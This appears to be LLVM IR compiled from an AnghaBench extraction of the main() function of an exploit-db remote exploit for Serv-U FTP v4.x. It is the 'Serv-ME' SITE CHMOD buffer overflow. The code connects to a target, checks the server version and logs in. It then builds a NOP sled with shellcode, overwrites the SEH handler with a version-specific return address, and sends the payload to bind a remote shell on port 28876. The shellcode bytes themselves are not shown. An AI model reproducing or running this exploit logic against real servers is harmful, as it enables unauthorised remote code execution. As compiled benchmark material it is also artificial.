; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_822.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_822.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [49 x i8] c"Usage: %s IP PORT USERNAME PASSWORD [DIRECTORY]\0A\00", align 1
@.str.1 = private unnamed_addr constant [500 x i8] c"- Serv-ME ----------------------------------------------------\0A  Serv-U v4.x \22site chmod\22 exploit.\0A  Written by SkyLined <SkyLined@EduP.TUDelft.nl>.\0A  Credits for the vulnerability go to ICBM <icbm@0x557.net>.\0A  Thanks to H D Moore for the shellcode (www.metasploit.com).\0A  Greets to everyone at 0dd and #netric.\0A  (K)(L)(F) for Suzan.\0A\0A  Binds a shell at %s:28876 if successfull.\0A  Tested with: v4.0.0.4, v4.1.0.0, v4.1.0.3 on W2K-EN.\0A--------------------------------------------------------------\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [29 x i8] c"\0A[+] Connecting to %s:%s...\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@sock = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [23 x i8] c"Socket creation failed\00", align 1
@.str.4 = private unnamed_addr constant [18 x i8] c"Connection failed\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@FILEsock = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [11 x i8] c"    --> %s\00", align 1
@.str.7 = private unnamed_addr constant [26 x i8] c"220 Serv-U FTP Server v4.\00", align 1
@.str.8 = private unnamed_addr constant [43 x i8] c"[-] This is not a Serv-U v4.X ftp server.\0A\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"v4.1\00", align 1
@retaddress_4103 = common dso_local global i8* null, align 8
@.str.10 = private unnamed_addr constant [8 x i8] c"4.1.0.3\00", align 1
@.str.11 = private unnamed_addr constant [27 x i8] c"\0A[+] Login in as %s:%s...\0A\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"USER\00", align 1
@.str.13 = private unnamed_addr constant [5 x i8] c"PASS\00", align 1
@.str.14 = private unnamed_addr constant [4 x i8] c"230\00", align 1
@.str.15 = private unnamed_addr constant [19 x i8] c"[-] Login failed.\0A\00", align 1
@.str.16 = private unnamed_addr constant [28 x i8] c"\0A[+] Changing directory...\0A\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"CD\00", align 1
@exploit_length = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8* null, align 8
@NOP = common dso_local global i32 0, align 4
@.str.18 = private unnamed_addr constant [46 x i8] c"\0A[+] Checking if \\xff doubling is nescesary: \00", align 1
@.str.19 = private unnamed_addr constant [15 x i8] c"SITE CHMOD 477\00", align 1
@.str.20 = private unnamed_addr constant [5 x i8] c"-\FF\FF-\00", align 1
@doubling = common dso_local global i32 0, align 4
@.str.21 = private unnamed_addr constant [5 x i8] c"Yes.\00", align 1
@retaddress_4004 = common dso_local global i8* null, align 8
@.str.22 = private unnamed_addr constant [8 x i8] c"4.0.0.4\00", align 1
@.str.23 = private unnamed_addr constant [4 x i8] c"No.\00", align 1
@retaddress_4100 = common dso_local global i8* null, align 8
@.str.24 = private unnamed_addr constant [8 x i8] c"4.1.0.0\00", align 1
@.str.25 = private unnamed_addr constant [59 x i8] c"\0A[+] Serv-U FTP server version %s: using retaddress 0x%08x\00", align 1
@SEH_handler_offset = common dso_local global i32 0, align 4
@SEH_handler = common dso_local global i8* null, align 8
@.str.26 = private unnamed_addr constant [25 x i8] c"\0A[+] Sending exploit... \00", align 1
@.str.27 = private unnamed_addr constant [47 x i8] c"send, you can now try to connect to %s:28876.\0A\00", align 1
@.str.28 = private unnamed_addr constant [13 x i8] c"\0A[+] Done. \0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca [256 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  store i8* null, i8** %11, align 8
  store i8* null, i8** %12, align 8
  %13 = load i32, i32* %5, align 4
  %14 = icmp slt i32 %13, 5
  br i1 %14, label %15, label %21

15:                                               ; preds = %3
  %16 = load i8**, i8*** %6, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str, i64 0, i64 0), i8* %18)
  %20 = call i32 @exit(i32 -1) #3
  unreachable

21:                                               ; preds = %3
  %22 = load i8**, i8*** %6, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 1
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([500 x i8], [500 x i8]* @.str.1, i64 0, i64 0), i8* %24)
  %26 = load i32, i32* @AF_INET, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %26, i32* %27, align 4
  %28 = load i8**, i8*** %6, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 2
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @atoi(i8* %30)
  %32 = call i32 @htons(i32 %31)
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i32 %32, i32* %33, align 4
  %34 = load i8**, i8*** %6, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 1
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @inet_addr(i8* %36)
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %39 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %38, i32 0, i32 0
  store i32 %37, i32* %39, align 4
  %40 = load i8**, i8*** %6, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 1
  %42 = load i8*, i8** %41, align 8
  %43 = load i8**, i8*** %6, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 2
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.2, i64 0, i64 0), i8* %42, i8* %45)
  %47 = load i32, i32* @AF_INET, align 4
  %48 = load i32, i32* @SOCK_STREAM, align 4
  %49 = load i32, i32* @IPPROTO_TCP, align 4
  %50 = call i32 @socket(i32 %47, i32 %48, i32 %49)
  store i32 %50, i32* @sock, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %55

52:                                               ; preds = %21
  %53 = call i32 @perror(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0))
  %54 = call i32 @exit(i32 -1) #3
  unreachable

55:                                               ; preds = %21
  %56 = load i32, i32* @sock, align 4
  %57 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %58 = call i32 @connect(i32 %56, %struct.sockaddr* %57, i32 12)
  %59 = icmp eq i32 %58, -1
  br i1 %59, label %60, label %63

60:                                               ; preds = %55
  %61 = call i32 @perror(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.4, i64 0, i64 0))
  %62 = call i32 @exit(i32 -1) #3
  unreachable

63:                                               ; preds = %55
  %64 = load i32, i32* @sock, align 4
  %65 = call i32 @fdopen(i32 %64, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  store i32 %65, i32* @FILEsock, align 4
  %66 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %67 = load i32, i32* @FILEsock, align 4
  %68 = call i8* @fgets(i8* %66, i32 256, i32 %67)
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i64 0, i64 0), i8* %68)
  %70 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %71 = call i8* @strstr(i8* %70, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.7, i64 0, i64 0))
  %72 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %73 = icmp ne i8* %71, %72
  br i1 %73, label %74, label %77

74:                                               ; preds = %63
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.8, i64 0, i64 0))
  %76 = call i32 @exit(i32 -1) #3
  unreachable

77:                                               ; preds = %63
  %78 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %79 = call i8* @strstr(i8* %78, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0))
  %80 = icmp ugt i8* %79, null
  br i1 %80, label %81, label %83

81:                                               ; preds = %77
  %82 = load i8*, i8** @retaddress_4103, align 8
  store i8* %82, i8** %11, align 8
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0), i8** %12, align 8
  br label %83

83:                                               ; preds = %81, %77
  %84 = load i8**, i8*** %6, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 3
  %86 = load i8*, i8** %85, align 8
  %87 = load i8**, i8*** %6, align 8
  %88 = getelementptr inbounds i8*, i8** %87, i64 4
  %89 = load i8*, i8** %88, align 8
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.11, i64 0, i64 0), i8* %86, i8* %89)
  %91 = load i8**, i8*** %6, align 8
  %92 = getelementptr inbounds i8*, i8** %91, i64 3
  %93 = load i8*, i8** %92, align 8
  %94 = call i32 @send_command(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0), i8* %93)
  %95 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %96 = load i32, i32* @FILEsock, align 4
  %97 = call i8* @fgets(i8* %95, i32 256, i32 %96)
  %98 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i64 0, i64 0), i8* %97)
  %99 = load i8**, i8*** %6, align 8
  %100 = getelementptr inbounds i8*, i8** %99, i64 4
  %101 = load i8*, i8** %100, align 8
  %102 = call i32 @send_command(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i64 0, i64 0), i8* %101)
  %103 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %104 = load i32, i32* @FILEsock, align 4
  %105 = call i8* @fgets(i8* %103, i32 256, i32 %104)
  %106 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i64 0, i64 0), i8* %105)
  %107 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %108 = call i8* @strstr(i8* %107, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.14, i64 0, i64 0))
  %109 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %110 = icmp ne i8* %108, %109
  br i1 %110, label %111, label %114

111:                                              ; preds = %83
  %112 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.15, i64 0, i64 0))
  %113 = call i32 @exit(i32 -1) #3
  unreachable

114:                                              ; preds = %83
  %115 = load i8**, i8*** %6, align 8
  %116 = getelementptr inbounds i8*, i8** %115, i64 5
  %117 = load i8*, i8** %116, align 8
  %118 = icmp ne i8* %117, null
  br i1 %118, label %119, label %129

119:                                              ; preds = %114
  %120 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.16, i64 0, i64 0))
  %121 = load i8**, i8*** %6, align 8
  %122 = getelementptr inbounds i8*, i8** %121, i64 5
  %123 = load i8*, i8** %122, align 8
  %124 = call i32 @send_command(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i64 0, i64 0), i8* %123)
  %125 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %126 = load i32, i32* @FILEsock, align 4
  %127 = call i8* @fgets(i8* %125, i32 256, i32 %126)
  %128 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i64 0, i64 0), i8* %127)
  br label %129

129:                                              ; preds = %119, %114
  %130 = load i32, i32* @exploit_length, align 4
  %131 = load i8*, i8** @shellcode, align 8
  %132 = call i32 @strlen(i8* %131)
  %133 = add nsw i32 %130, %132
  %134 = call i64 @malloc(i32 %133)
  %135 = inttoptr i64 %134 to i8*
  store i8* %135, i8** %9, align 8
  %136 = load i8*, i8** %9, align 8
  %137 = load i32, i32* @NOP, align 4
  %138 = load i32, i32* @exploit_length, align 4
  %139 = call i32 @memset(i8* %136, i32 %137, i32 %138)
  %140 = load i8*, i8** %9, align 8
  %141 = load i32, i32* @exploit_length, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds i8, i8* %140, i64 %142
  %144 = load i8*, i8** @shellcode, align 8
  %145 = load i8*, i8** @shellcode, align 8
  %146 = call i32 @strlen(i8* %145)
  %147 = call i32 @memcpy(i8* %143, i8* %144, i32 %146)
  %148 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.18, i64 0, i64 0))
  %149 = call i32 @send_command(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.19, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0))
  %150 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %151 = load i32, i32* @FILEsock, align 4
  %152 = call i8* @fgets(i8* %150, i32 256, i32 %151)
  %153 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %154 = call i64 @strchr(i8* %153, float -1.000000e+00)
  %155 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %156 = call i64 @strrchr(i8* %155, float -1.000000e+00)
  %157 = icmp eq i64 %154, %156
  br i1 %157, label %158, label %161

158:                                              ; preds = %129
  store i32 1, i32* @doubling, align 4
  %159 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i64 0, i64 0))
  %160 = load i8*, i8** @retaddress_4004, align 8
  store i8* %160, i8** %11, align 8
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.22, i64 0, i64 0), i8** %12, align 8
  br label %168

161:                                              ; preds = %129
  %162 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.23, i64 0, i64 0))
  %163 = load i8*, i8** %11, align 8
  %164 = icmp eq i8* %163, null
  br i1 %164, label %165, label %167

165:                                              ; preds = %161
  %166 = load i8*, i8** @retaddress_4100, align 8
  store i8* %166, i8** %11, align 8
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.24, i64 0, i64 0), i8** %12, align 8
  br label %167

167:                                              ; preds = %165, %161
  br label %168

168:                                              ; preds = %167, %158
  %169 = load i8*, i8** %12, align 8
  %170 = load i8*, i8** %11, align 8
  %171 = bitcast i8* %170 to i32*
  %172 = load i32, i32* %171, align 4
  %173 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.25, i64 0, i64 0), i8* %169, i32 %172)
  %174 = load i8*, i8** %9, align 8
  %175 = load i32, i32* @SEH_handler_offset, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds i8, i8* %174, i64 %176
  %178 = load i8*, i8** @SEH_handler, align 8
  %179 = load i8*, i8** @SEH_handler, align 8
  %180 = call i32 @strlen(i8* %179)
  %181 = call i32 @memcpy(i8* %177, i8* %178, i32 %180)
  %182 = load i8*, i8** %9, align 8
  %183 = load i32, i32* @SEH_handler_offset, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds i8, i8* %182, i64 %184
  %186 = getelementptr inbounds i8, i8* %185, i64 4
  %187 = load i8*, i8** %11, align 8
  %188 = load i8*, i8** %11, align 8
  %189 = call i32 @strlen(i8* %188)
  %190 = call i32 @memcpy(i8* %186, i8* %187, i32 %189)
  %191 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.26, i64 0, i64 0))
  %192 = load i8*, i8** %9, align 8
  %193 = call i32 @send_command(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.19, i64 0, i64 0), i8* %192)
  %194 = load i8**, i8*** %6, align 8
  %195 = getelementptr inbounds i8*, i8** %194, i64 1
  %196 = load i8*, i8** %195, align 8
  %197 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.27, i64 0, i64 0), i8* %196)
  %198 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %199 = load i32, i32* @FILEsock, align 4
  %200 = call i8* @fgets(i8* %198, i32 256, i32 %199)
  %201 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i64 0, i64 0), i8* %200)
  %202 = call i32 @close(i32 (i32, i32, i32)* @socket)
  %203 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.28, i64 0, i64 0))
  %204 = load i32, i32* %4, align 4
  ret i32 %204
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @fdopen(i32, i8*) #1

declare dso_local i8* @fgets(i8*, i32, i32) #1

declare dso_local i8* @strstr(i8*, i8*) #1

declare dso_local i32 @send_command(i8*, i8*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i64 @strchr(i8*, float) #1

declare dso_local i64 @strrchr(i8*, float) #1

declare dso_local i32 @close(i32 (i32, i32, i32)*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
